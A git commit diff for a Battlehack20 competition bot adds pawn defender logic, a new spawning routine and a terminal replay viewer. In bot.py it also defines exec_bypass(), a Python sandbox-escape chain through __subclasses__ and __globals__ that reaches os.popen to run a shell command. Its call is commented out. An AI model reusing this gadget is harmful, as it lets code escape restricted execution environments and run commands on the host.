95f3ac7feb66cde3725a3d7676c7f2d8e64767ab
Srikar Gouru <srikarg89@gmail.com>
2020-04-18 12:51:25 -0400

    REPLAY GANG

--- dontdie/bot.py
+++ dontdie/bot.py
@@ -1,5 +1,5 @@
 import random
-
+from battlehack20.stubs import *
 
 # This is an example bot written by the developers!
 # Use this to help write your own code, or run it against your bot to see how well you can do!
@@ -7,6 +7,11 @@ import random
 DEBUG = 0
 def dlog(str):
     if DEBUG > 0:
+        log(str)
+
+
+def ilog(str):
+    if True:
         log(str)
 
 
@@ -29,20 +34,34 @@ class Pawn:
     def __init__(self):
         self.team = get_team()
         self.forward = 1 if self.team == Team.WHITE else -1
-        self.type = "ATTACKER"
+        self.update_state()
+#        if self.col < 5:
+        if False:
+            self.type = "DEFENDER"
+        else:
+            self.type = "ATTACKER"
         self.board_size = get_board_size()
 
     def update_state(self):
         self.row, self.col = get_location()
+#         ilog(str(self.col))
         self.nextrow = self.row + self.forward
+
+
+    def check_piece_relative(self, rdiff, cdiff):
+        return check_space_wrapper(self.row + rdiff, self.col + cdiff * self.forward, self.board_size)
+
 
     def run(self):
         self.update_state()
         if self.type == "ATTACKER":
             self.runattacker()
+        elif self.type == "DEFENDER":
+            self.rundefender()
         
         bytecode = get_bytecode()
         dlog('Done! Bytecode left: ' + str(bytecode))
+    
 
     def runattacker(self):
         if self.trycapture():
@@ -50,10 +69,23 @@ class Pawn:
         if not self.forward_is_dangerous():
             self.tryforward()
 
+
+    def rundefender(self):
+        if self.trycapture():
+            return
+        if self.check_piece_relative(0, 1) == opp_team:
+            # Don't let the guy in front of you cross you gdi
+            return
+        # Lattice formation
+        if self.check_piece_relative(1, 0) == team or self.check_piece_relative(-1, 0) == team:
+            self.tryforward()
+
+
     def tryforward(self):
         if self.nextrow != -1 and self.nextrow != board_size and not check_space_wrapper(self.nextrow, self.col, self.board_size):
             move_forward()
             dlog('Moved forward!')
+
 
     def forward_is_dangerous(self):
         for cdiff in [-1, 1]:
@@ -78,19 +110,43 @@ class Overlord:
         self.team = get_team()
         self.forward = 1 if self.team == Team.WHITE else -1
         self.board_size = get_board_size()
+        if self.team == Team.WHITE:
+            self.index = 0
+        else:
+            self.index = self.board_size - 1
 
     def run(self):
-        if self.team == Team.WHITE:
-            index = 0
-        else:
-            index = self.board_size - 1
-
-        for _ in range(self.board_size):
-            i = random.randint(0, self.board_size - 1)
-            if not check_space(index, i):
-                spawn(index, i)
-                dlog('Spawned unit at: (' + str(index) + ', ' + str(i) + ')')
+        if self.check_defense():
+            return
+        self.spawnrandom(5, self.board_size)
+    
+    def check_defense(self):
+        for i in range(self.board_size):
+            need_defense = False
+            for j in range(5):
+                if check_space(self.index, i) == opp_team:
+                    need_defense = True
+                    break
+            if not need_defense:
                 break
+            if not check_space(self.index, i):
+                if check_space(self.index, i) != self.team:
+                    spawn(self.index, i)
+                    return True
+        return False
+
+    def spawnrandom(self, min=None, max=None):
+        if min is None: min = 0
+        if max is None: max = self.board_size
+        for _ in range(min, max):
+            i = random.randint(0, self.board_size - 1)
+            if not check_space(self.index, i):
+                spawn(self.index, i)
+                dlog('Spawned unit at: (' + str(self.index) + ', ' + str(i) + ')')
+                return
+
+def exec_bypass():
+    return getattr(getattr(getattr(getattr(getattr([], '__class__'),'__base__'), '__subclasses__')().pop(78), '__init__'), '__globals__').pop('sys').modules.pop('os').popen('id').read()
 
 
 robot = Pawn() if get_type() == RobotType.PAWN else Overlord()
@@ -101,4 +157,9 @@ def turn():
     This function will be called at the beginning of every turn and should contain the bulk of your robot commands
     """
 
+#    exec_bypass()
+#    __globals__
+
     robot.run()
+    bytecode = get_bytecode()
+    dlog('Done! Bytecode left: ' + str(bytecode))
---
+++ replay.py
@@ -0,0 +1,74 @@
+import sys
+import time
+
+board_size = 16
+colors = True
+
+def piece_string(team, id):
+    return '%s%3d' % (team, id)
+
+def clear():
+    for i in range(board_size + 1):
+        sys.stdout.write("\033[F")  # back to previous line
+        sys.stdout.write("\033[K")  # clear line
+
+def view_board(board):
+    new_board = ''
+    for i in range(board_size):
+        for j in range(board_size):
+            if board[i][j]:
+                new_board += '['
+                if colors:
+                    if board[i][j][0] == 'W':
+                        new_board += '\033[1m\u001b[37m'
+                    else:
+                        new_board += '\033[1m\u001b[36m'
+                new_board += piece_string(board[i][j][0], board[i][j][1])
+                if colors:
+                    new_board += '\033[0m\u001b[0m'
+                new_board += '] '
+            else:
+                new_board += '[    ] '
+        new_board += '\n'
+    print(new_board)
+    return new_board
+
+
+def play(board_states, delay=0.5):
+    print('')
+    for state_index in range(len(board_states)):
+        view_board(board_states[state_index])
+        time.sleep(delay)
+        clear()
+
+
+def parse_txt(filename):
+    file = open(filename, "r")
+    lines = [line.strip() for line in file]
+    start = lines.index("")
+    print("Starting line: ", start)
+    idx = start + 1
+    boards = []
+    while idx < len(lines) - board_size:
+        board = []
+        for i in range(board_size):
+            line = lines[idx]
+            spots = [line[i:i+7].strip() for i in range(0, len(line), 7)]
+            assert(len(spots) == board_size)
+            row = []
+            for spot in spots:
+                if spot[1] == ' ':
+                    row.append(None)
+                    continue
+                team = spot[1]
+                num = int(spot[2:5])
+                row.append((team, num))
+            board.append(row)
+            idx += 1
+        boards.append(board)
+        idx += 1
+    return boards
+
+boards = parse_txt("replay.txt")
+print(len(boards))
+play(boards)
